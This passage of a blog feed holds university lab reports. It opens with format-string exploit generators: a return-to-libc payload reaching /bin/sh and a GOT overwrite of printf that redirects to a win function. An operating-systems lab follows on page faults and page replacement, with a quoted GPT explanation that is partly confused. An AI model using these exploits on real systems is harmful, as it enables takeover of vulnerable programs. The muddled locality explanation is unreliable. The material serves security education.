\</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">1</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%19$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">2</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%21$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">3</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%23$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">4</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%25$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">5</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%27$hn&quot;</span> + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    payload += (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N - <span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Generate payload for format string exploit.&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;ret_address&#x27;</span>, <span class="built_in">type</span>=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x, <span class="number">16</span>), <span class="built_in">help</span>=<span class="string">&quot;Return address in hexadecimal&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;sh_str_address&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Address of /bin/sh string in hexadecimal&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;exit_address&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Address of exit function in hexadecimal&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;system_address&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Address of system function in hexadecimal&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    payload = generate_payload(args.ret_address, args.sh_str_address, args.exit_address, args.system_address)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write the content to input2</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;input2&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh exploit_prog2_2.sh bfffeccc b7ec582b b7d989d0 b7da4da0</span><br></pre></td></tr></table></figure></li></ol><h2 id="prog2-got-table-hijacking-call-win-function">prog2 GOT tablehijacking, call win function</h2><p>Attack approach: Use printf function to modify the offset printf inthe GOT table to the win function address, making the last printf in thefmtstf function execute the win function.</p><ol type="1"><li><p>View GOT table, find printf function address as 0x0804a00c</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -R prog2</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171850643.png"alt="image-20240614171850643" /><figcaption aria-hidden="true">image-20240614171850643</figcaption></figure></li><li><p>View PLT table, see win function address as 0x0804850b</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d prog2 | grep -A 18 win</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171908045.png"alt="image-20240614171908045" /><figcaption aria-hidden="true">image-20240614171908045</figcaption></figure></li><li><p>Start attack</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable address randomization</span></span><br><span class="line">sudo sysctl -w kernel.randomize_va_space=2</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">win_addr, printf_addr</span>):</span><br><span class="line"></span><br><span class="line">    addr = printf_addr</span><br><span class="line">    payload = (addr + <span class="number">2</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># high 2 bytes of win function address</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># low 2 bytes of win function address</span></span><br><span class="line">    </span><br><span class="line">    win_addr = <span class="built_in">int</span>(win_addr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Calculate the offset values for the format string</span></span><br><span class="line">    offset1 = (win_addr &gt;&gt; <span class="number">16</span>) - <span class="number">3</span>*<span class="number">4</span> - <span class="number">8</span>*<span class="number">15</span></span><br><span class="line">    offset2 = (win_addr &amp; <span class="number">0xffff</span>) - (win_addr &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> offset2 &lt; <span class="number">0</span>:</span><br><span class="line">        offset2 += <span class="number">0x10000</span></span><br><span class="line"></span><br><span class="line">    s = <span class="string">&quot;%.8x&quot;</span> * <span class="number">15</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offset1) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offset2) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%hn&quot;</span> + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    payload += (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Generate payload for format string exploit.&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;win_address&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Address of win function in hexadecimal&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;printf_address&#x27;</span>, <span class="built_in">type</span>=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x, <span class="number">16</span>), <span class="built_in">help</span>=<span class="string">&quot;Address of printf function in hexadecimal&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    payload = generate_payload(args.win_address, args.printf_address)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write the content to input2</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;input2&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh exploit_prog2_3.sh 0804850b 0804a00c</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614172148953.png"alt="image-20240614172148953" /><figcaption aria-hidden="true">image-20240614172148953</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614173640106.png"alt="image-20240614173640106" /><figcaption aria-hidden="true">image-20240614173640106</figcaption></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> HUST Lab Reports </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUST Operating System Lab3: Memory Management</title>
      <link href="/2023/12/05/HUST-Labs/HUST%20Operating%20System%20Lab3:%20Memory%20Management/"/>
      <url>/2023/12/05/HUST-Labs/HUST%20Operating%20System%20Lab3:%20Memory%20Management/</url>
      
        <content type="html"><![CDATA[<h1 id="operating-system-lab3-memory-management">Operating System Lab3:Memory Management</h1><h2 id="experiment-objectives">Experiment Objectives</h2><ol type="1"><li><p>Understand page replacement algorithm principles and writeprograms to demonstrate page replacement algorithms.</p></li><li><p>Verify the mechanism of Linux virtual address to physical addressconversion</p></li><li><p>Understand and verify the principle of program executionlocality.</p></li><li><p>Understand and verify the page fault handling process.</p></li></ol><h2 id="experiment-content">Experiment Content</h2><ol type="1"><li><p>Write a 2D array traversal program in Win/Linux to understand theprinciple of locality.</p></li><li><p>Simulate and implement OPT, FIFO, or LRU page replacementalgorithms in Windows/Linux.</p></li><li><p>Study and modify Linux kernel’s page fault handling functiondo_no_page (new version should be handle_mm_fault) or page frameallocation function get_free_page, and use printk to print debuginformation. Note: Kernel compilation is required. <strong>Recommended:Ubuntu Kylin or Kylin system</strong>.</p></li><li><p>Use /proc/pid/pagemap technology in Linux to calculate physicaladdresses corresponding to virtual addresses of variables or functions.<strong>Recommended: Ubuntu Kylin or Kylin system</strong>.</p></li></ol><h2id="task-1-write-a-2d-array-traversal-program-to-understand-the-principle-of-program-locality">Task1: Write a 2D Array Traversal Program to Understand the Principle ofProgram Locality</h2><h3 id="task-requirements">Task Requirements</h3><ol type="1"><li><p>Make the array as large as possible, and try changing the arraysize and the order of inner and outer loops. For example, change from[2048] X [2048] to [10240] x [20480], and observe their traversalefficiency.</p></li><li><p>Observe their page fault counts in Task Manager or using the/proc file system.</p></li></ol><h3 id="code-implementation">Code Implementation</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Row-major traversal</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">traverseRowMajor</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; arr[i].<span class="built_in">size</span>(); j++)</span><br><span class="line">        &#123;</span><br><span class="line">            sum += arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Column-major traversal</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">traverseColumnMajor</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; arr[<span class="number">0</span>].<span class="built_in">size</span>(); j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sum += arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> rows, cols;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Enter the number of rows and columns of the matrix (format: x y): &quot;</span>;</span><br><span class="line">    cin &gt;&gt; rows &gt;&gt; cols;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">arr</span>(rows, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(cols, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    rusage usage;</span><br><span class="line">    timeval start, end;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> choice;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Choose traversal method (r: row-major, c: column-major): &quot;</span>;</span><br><span class="line">    </span><br><span class="line">    cin &gt;&gt; choice;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get process resource usage before starting</span></span><br><span class="line">    <span class="built_in">getrusage</span>(RUSAGE_SELF, &amp;usage);</span><br><span class="line">    start = usage.ru_utime;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">traverseRowMajor</span>(arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">traverseColumnMajor</span>(arr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get process resource usage after completion</span></span><br><span class="line">    <span class="built_in">getrusage</span>(RUSAGE_SELF, &amp;usage);</span><br><span class="line">    end = usage.ru_utime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Output time in milliseconds</span></span><br><span class="line">    <span class="type">double</span> time_taken = (end.tv_sec - start.tv_sec) * <span class="number">1000</span> + (end.tv_usec - start.tv_usec) / <span class="number">1000.0</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; fixed &lt;&lt; <span class="built_in">setprecision</span>(<span class="number">3</span>) &lt;&lt; <span class="string">&quot;Time consumed: &quot;</span> &lt;&lt; time_taken &lt;&lt; <span class="string">&quot; milliseconds\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Page faults: &quot;</span> &lt;&lt; usage.ru_minflt &lt;&lt; <span class="string">&quot; times\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="bit-program-compilation">32-bit Program Compilation</h3><p>If you directly add -m32 for compilation, it will report anerror:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-1-32bit_error.png"alt="32bit compilation error" /><figcaption aria-hidden="true">32bit compilation error</figcaption></figure><p>Because 32-bit libraries are missing, you need to install 32-bitlibraries:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dpkg --add-architecture i386              <span class="comment"># Add 32-bit architecture</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install gcc-multilib g++-multilib <span class="comment"># Install 32-bit libraries</span></span><br></pre></td></tr></table></figure><h3 id="bit-and-64-bit-program-execution-results">32-bit and 64-bitProgram Execution Results</h3><p>Using g++ to compile 32-bit and 64-bit executable files test_32 andtest_64 respectively, the execution results are as follows:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-1-result1.png"alt="64-bit execution result" /><figcaption aria-hidden="true">64-bit execution result</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-1-result2.png"alt="32-bit execution result" /><figcaption aria-hidden="true">32-bit execution result</figcaption></figure><h3 id="observation-and-analysis-of-phenomena">Observation and Analysisof Phenomena</h3><ol type="1"><li>Execution time:<ol type="1"><li>In smaller matrices (2048x2048), 64-bit programs have slightly lessexecution time than 32-bit programs.</li><li>In larger matrices (10240x20480), 64-bit programs are significantlyfaster than 32-bit programs in row-major traversal, but in column-majortraversal, the time difference between the two is not significant.</li></ol></li><li>Page faults:<ol type="1"><li>For both programs (32-bit and 64-bit), under the same matrix sizeand traversal method, the number of page faults is almostidentical.</li></ol></li></ol><p>Execution time differences:</p><p>64-bit programs can typically handle large datasets more efficientlybecause they can utilize larger address spaces and generally moreefficient data processing capabilities (e.g., larger registers andbetter memory management). This explains why 64-bit programs are fasterthan 32-bit programs in row-major traversal when processing largermatrices. For column-major traversal, due to memory access patternscausing frequent cache misses, this may somewhat offset the advantagesof 64-bit architecture, resulting in similar performance between the twoin large matrix column-major traversal.</p><p>Page fault similarity:</p><p>The number of page faults mainly depends on the program’s memoryaccess patterns and the operating system’s page management strategy,rather than the program’s bit width. Therefore, even for 32-bit and64-bit programs, if they perform the same memory access operations, thenumber of page faults may be very similar. It seems more dependent onmemory access patterns and the operating system’s memory management.</p><p>But I actually have a question: intuitively, column-major traversalshould produce more page faults than row-major traversal, because incolumn-major traversal, each access address is continuous, while inrow-major traversal, each access address is discontinuous. But inreality, the number of page faults for both is almost the same.</p><p><strong>GPT’s answer:</strong></p><ul><li>Memory paging and access patterns:<ul><li>In modern computer systems, physical memory is managed in pages. Ifa matrix’s rows or columns span multiple memory pages, then bothrow-major and column-major traversal may cause page faults.</li><li>In row-major traversal, if each row of the matrix spans multiplepages, then even if access is continuous, page faults may occur whenaccessing new rows.</li><li>In column-major traversal, although each jump to a new column maytouch new memory pages, if the column data is small and can becompletely contained within a single or few memory pages, the occurrenceof page faults may not be much more than in row-major traversal.</li></ul></li><li>Cache and prefetch strategies:<ul><li>Modern processors have advanced cache and prefetch mechanisms. Thesemechanisms may somewhat reduce the expected number of page faults incolumn-major traversal.</li><li>Processors may be able to predict upcoming memory access patternsand preload data from main memory to cache, so even column-major accessmay not immediately cause page faults.</li></ul></li><li>Operating system memory management:<ul><li>The operating system may adopt some strategies in memory management,such as lazy allocation, which may cause the actual number of pagefaults to differ from expectations.</li><li>The operating system may maintain a certain number of free pagepools, so in early memory access, the occurrence rate of page faults maybe lower.</li></ul></li><li>Physical memory layout of matrices:<ul><li>The actual layout of matrices in physical memory may also affect theoccurrence of page faults. For example, if some parts of the matrix havealready been loaded into memory for other reasons, this may reduce pagefaults in specific traversal methods.</li></ul></li><li>Overall system memory load:<ul><li>If other processes running on the system consume a lot of memory,this may affect the page fault behavior of your program. The overallmemory load and availability of the system may cause different pagefault behaviors for the same operation at different time points.</li></ul></li></ul><h2id="task-2-simulate-and-implement-opt-fifo-or-lru-page-replacement-algorithms">Task2: Simulate and Implement OPT, FIFO, or LRU Page ReplacementAlgorithms</h2><h3 id="task-requirements-1">Task Requirements</h3><ol type="1"><li><p>Use array traversal operations to simulate program instructionexecution;</p></li><li><p>Use one large array A (e.g., 2400 elements) to simulate aprocess, with random numbers in the array. When each element isaccessed, use printf to print it out, simulating instruction execution.The size of array A must be an integer multiple of the set page size(e.g., 10 elements or 16 elements, etc.).</p></li><li><p>Use 3-8 small arrays (e.g., array B, array C, array D, etc.) tosimulate allocated page frames. The size of small arrays equals the pagesize (e.g., 10 instruction sizes, i.e., 10 elements). The small arrayscontain copies of the corresponding page content from the large array(build a page table separately to describe the relationship betweenpages of the large array and small array indices).</p></li><li><p>Access array A in different orders, which can be: sequential,jump, branch, loop, or random. Build access orders yourself. Differentorders also reflect program locality to some extent.</p></li><li><p>The access order of the large array can be defined using therand() function to simulate instruction access sequences correspondingto the access order of large array A. Then transform the instructionsequence into corresponding page address streams and count “page faults”for different page replacement algorithms. Page faults occur when thecorresponding “page” is not loaded into small arrays (e.g., array B,array C, array D, etc.).</p></li><li><p>In the experiment, page size, number of page frames, accessorder, and replacement algorithm should all be adjustable.</p></li></ol><h3 id="code-implementation-1">Code Implementation</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span 